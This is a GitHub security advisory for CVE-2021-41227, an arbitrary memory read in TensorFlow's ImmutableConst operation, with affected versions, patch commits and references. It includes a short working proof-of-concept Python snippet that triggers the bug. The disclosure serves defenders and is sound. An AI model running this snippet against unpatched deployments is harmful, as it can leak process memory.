# [M] Arbitrary memory read in `ImmutableConst`

## Summary
Severity: Medium
Advisory: GHSA-j8c8-67vp-6mx7
CVE: CVE-2021-41227
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2021-11-10
Source: https://github.com/advisories/GHSA-j8c8-67vp-6mx7
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow` — affected >=0 <2.4.4
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-cpu` — affected >=0 <2.4.4
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-gpu` — affected >=0 <2.4.4

## Details
### Impact
The `ImmutableConst` operation in TensorFlow can be tricked into reading arbitrary memory contents:

```python
import tensorflow as tf
  
with open('/tmp/test','wb') as f:
    f.write(b'\xe2'*128)
    data = tf.raw_ops.ImmutableConst(dtype=tf.string,shape=3,memory_region_name='/tmp/test')
  
print(data)
```
  
This is because the `tstring` TensorFlow string class has a special case for memory mapped strings but the operation itself does not offer any support for this datatype.

### Patches
We have patched the issue in GitHub commit [3712a2d3455e6ccb924daa5724a3652a86f6b585](https://github.com/tensorflow/tensorflow/commit/3712a2d3455e6ccb924daa5724a3652a86f6b585) and GitHub commit [1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b](https://github.com/tensorflow/tensorflow/commit/1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b).
  
The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j8c8-67vp-6mx7
- https://nvd.nist.gov/vuln/detail/CVE-2021-41227
- https://github.com/tensorflow/tensorflow/commit/1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b
- https://github.com/tensorflow/tensorflow/commit/3712a2d3455e6ccb924daa5724a3652a86f6b585
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-636.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-834.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-419.yaml
- https://github.com/tensorflow/tensorflow
